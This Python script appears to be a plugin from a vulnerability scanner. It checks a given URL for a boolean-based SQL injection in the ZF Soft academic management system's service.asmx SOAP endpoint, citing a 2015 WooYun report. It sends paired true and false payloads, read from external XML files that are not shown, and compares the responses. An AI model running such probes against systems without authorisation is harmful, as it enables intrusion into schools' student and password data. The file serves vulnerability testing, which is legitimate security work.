#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 正方教务系统services.asmx SQL注入
referer: http://www.wooyun.org/bugs/WooYun-2015-122523
author: Lucifer
description: webservice注入。
'''
import re
import os
import sys
import requests



class zfsoft_service_stryhm_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
            "Content-Type":"text/xml; charset=utf-8",
            "SOAPAction":"http://www.zf_webservice.com/BMCheckPassword"
        }
        payload = "/service.asmx"
        true_path = os.getcwd() + "/xml/zfsoft_service_stryhm_sqli_true.xml"
        false_path = os.getcwd() + "/xml/zfsoft_service_stryhm_sqli_false.xml"
        with open(true_path, "r") as f:
            post_data_true = f.read()
        with open(false_path, "r") as f:
            post_data_false = f.read()
        pattern = re.compile('<BMCheckPasswordResult xsi:type="xsd:int">[0-9]</BMCheckPasswordResult>')
        vulnurl = self.url + payload
        try:
            req1 = requests.post(vulnurl, data=post_data_true, headers=headers, timeout=10, verify=False)
            req2 = requests.post(vulnurl, data=post_data_false, headers=headers, timeout=10, verify=False)
            match1 = pattern.search(req1.text)
            match2 = pattern.search(req2.text)
            res_true = int(match1.group(0).replace('<BMCheckPasswordResult xsi:type="xsd:int">', '').replace('</BMCheckPasswordResult>',''))
            res_false = int(match2.group(0).replace('<BMCheckPasswordResult xsi:type="xsd:int">', '').replace('</BMCheckPasswordResult>',''))
            if res_true!=res_false:
                return "[+]存在正方教务系统services.asmx SQL注入漏洞...(高危)\tpayload: "+vulnurl+"..[需要对比查看xml文件内容]"

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = zfsoft_service_stryhm_sqli_BaseVerify(sys.argv[1])
    testVuln.run()